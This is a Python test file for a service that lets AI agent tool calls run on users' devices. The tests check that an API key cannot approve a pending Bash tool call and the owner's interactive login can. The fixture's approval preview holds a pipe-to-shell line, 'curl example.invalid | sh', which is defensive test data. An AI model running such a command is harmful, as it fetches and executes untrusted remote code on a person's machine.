"""A device job's tool approval is the person's own login decision (web or phone), never an API key's: an approval
lets a tool run on their machine, so a leaked CI or MCP key must not approve a shell command there."""

from __future__ import annotations

from datetime import timedelta

import pytest
from sqlalchemy import select

from app.models import APIKey, DeviceJob, DeviceJobApproval, Project
from app.services.api_key.service import _hash_api_key, generate_api_key_value
from app.services.devices.hub import device_hub
from app.time_utils import utc_now
from tests.devices.device_support import RecordingConnection, device_with_grant, enable_device_runs


class Connected(RecordingConnection):
    seat_login = False


@pytest.fixture(autouse=True)
async def _device_runs_on(db):
    device_hub.clear()
    await enable_device_runs(db)
    yield
    device_hub.clear()


async def _pending_approval(client, db, auth_headers, auth_user) -> tuple[DeviceJob, DeviceJobApproval]:
    device, _ = await device_with_grant(db, auth_user)
    device_hub._connections[device.id] = Connected(device.id)
    project = (await db.execute(select(Project).where(Project.name == "acme-orders"))).scalar_one()
    sent = await client.post("/chat/api/send", headers=auth_headers, json={
        "prompt": "Run the tests", "project_id": project.id,
        "execution_target": {"kind": "device", "device_id": device.id, "folder": "/home/sample/src",
                             "profile": "governed"}})
    assert sent.status_code == 200, sent.text
    job = (await db.execute(select(DeviceJob))).scalar_one()
    approval = DeviceJobApproval(request_id="r1", job_id=job.id, owner_user_id=auth_user.id, tool="Bash",
                                 input_preview="curl example.invalid | sh",
                                 expires_at=utc_now() + timedelta(minutes=5))
    db.add(approval)
    await db.commit()
    return job, approval


@pytest.mark.asyncio
async def test_an_api_key_of_the_owner_cannot_approve(client, db, auth_headers, auth_user):
    job, approval = await _pending_approval(client, db, auth_headers, auth_user)
    raw, prefix = generate_api_key_value()
    db.add(APIKey(user_id=auth_user.id, key_hash=_hash_api_key(raw), key_prefix=prefix, name="ci",
                  scopes=["knowledge:read"]))
    await db.commit()

    refused = await client.post(f"/api/v1/device-jobs/{job.id}/approvals/{approval.id}", headers={"X-API-Key": raw},
                                json={"decision": "allow_once"})

    assert refused.status_code == 403
    assert refused.json()["reason"] == "interactive_login_required"
    await db.refresh(approval)
    assert approval.decided_at is None


@pytest.mark.asyncio
async def test_the_owners_login_approves(client, db, auth_headers, auth_user):
    job, approval = await _pending_approval(client, db, auth_headers, auth_user)

    decided = await client.post(f"/api/v1/device-jobs/{job.id}/approvals/{approval.id}", headers=auth_headers,
                                json={"decision": "allow_once"})

    assert decided.status_code == 200, decided.text
    assert decided.json()["status"] == "allowed"
